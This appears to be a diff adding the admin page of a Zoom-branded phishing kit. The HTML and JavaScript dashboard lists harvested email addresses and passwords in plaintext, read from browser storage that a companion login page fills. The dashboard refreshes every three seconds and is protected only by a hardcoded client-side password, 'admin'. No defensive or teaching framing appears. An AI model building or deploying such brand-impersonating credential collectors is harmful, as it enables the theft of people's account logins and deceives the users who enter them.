@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zoom Admin Portal </title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        body { background: linear-gradient(135deg, #f8fbff 0%, #e8f0fe 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .admin-container {
+            max-width: 900px;
+            width: 90%;
+        }
+        .admin-panel {
+            background: white;
+            padding: 3rem;
+            border-radius: 24px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .admin-login input {
+            width: 100%;
+            max-width: 300px;
+            padding: 1.25rem;
+            border: 2px solid #e5e7eb;
+            border-radius: 12px;
+            font-size: 1rem;
+            margin-bottom: 1.5rem;
+            transition: border-color 0.3s;
+        }
+        .admin-login input:focus {
+            border-color: #4387f4;
+            outline: none;
+        }
+        .user-item {
+            background: #f8fafc;
+            padding: 1.5rem;
+            margin-bottom: 1rem;
+            border-radius: 12px;
+            border-left: 5px solid #4387f4;
+            text-align: left;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+        .btn-admin {
+            padding: 1rem 2rem;
+            border-radius: 12px;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-size: 1rem;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #4387f4, #366fd8);
+            color: white;
+        }
+        .btn-logout {
+            background: #6b7280;
+            color: white;
+        }
+        .btn-clear {
+            background: linear-gradient(135deg, #ef4444, #dc2626);
+            color: white;
+        }
+        .btn-refresh {
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+        #usersContainer {
+            max-height: 500px;
+            overflow-y: auto;
+            margin: 2rem 0;
+        }
+        .empty-state {
+            color: #6b7280;
+            font-style: italic;
+            padding: 3rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="admin-container">
+        <div class="admin-panel">
+            <div id="login-section">
+                <h1><i class="fas fa-shield-alt" style="color: #4387f4; margin-right: 1rem;"></i>Admin Portal </h1>
+                <input type="password" id="adminPass" placeholder="Admin Password (admin)">
+                <button onclick="checkLogin()" class="btn-admin btn-primary">Login</button>
+            </div>
+            <div id="dashboard" style="display: none;">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 2rem;">
+                    <h2>User Credentials <span id="count">(0)</span></h2>
+                    <div>
+                        <button onclick="refreshList()" class="btn-admin btn-refresh" style="margin-right: 1rem;">🔄 Refresh</button>
+                        <button onclick="logout()" class="btn-admin btn-logout">Logout</button>
+                    </div>
+                </div>
+                <div id="userList"></div>
+
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const ADMIN_PASS = 'admin';
+        let users2 = [];
+        
+        function checkLogin() {
+            if (document.getElementById('adminPass').value === ADMIN_PASS) {
+                document.getElementById('login-section').style.display = 'none';
+                document.getElementById('dashboard').style.display = 'block';
+                refreshList();
+            } else {
+                alert('Wrong password');
+            }
+        }
+        
+        function refreshList() {
+            const mainUsers = JSON.parse(localStorage.getItem('zoomUsers') || '[]');
+            const portalUsers = JSON.parse(localStorage.getItem('zoomUsers2') || '[]');
+            users2 = [...portalUsers, ...mainUsers];
+            
+            updateUI();
+        }
+        
+        function updateUI() {
+            const container = document.getElementById('userList');
+            const count = document.getElementById('count');
+            
+            count.textContent = `(${users2.length})`;
+            
+            if (users2.length === 0) {
+                container.innerHTML = '<div class="empty-state">No logins yet. Use Login button on landing page.</div>';
+            } else {
+                container.innerHTML = users2.map((user, index) => `
+                    <div class="user-item">
+                        <strong>#${index + 1} ${user.email}</strong><br>
+                        Password: <code style="background: #fee2e2; padding: 0.3rem 0.6rem; border-radius: 4px; font-family: monospace; color: #dc2626;">${user.password}</code><br>
+                        <small>Time: ${new Date(user.timestamp).toLocaleString()}</small>
+                    </div>
+                `).join('');
+            }
+        }
+        
+        
+        function logout() {
+            document.getElementById('login-section').style.display = 'block';
+            document.getElementById('dashboard').style.display = 'none';
+            document.getElementById('adminPass').value = '';
+        }
+        
+        // Auto refresh every 3 seconds
+        setInterval(refreshList, 3000);
+        refreshList(); // Initial load
+    </script>
+</body>
+</html>
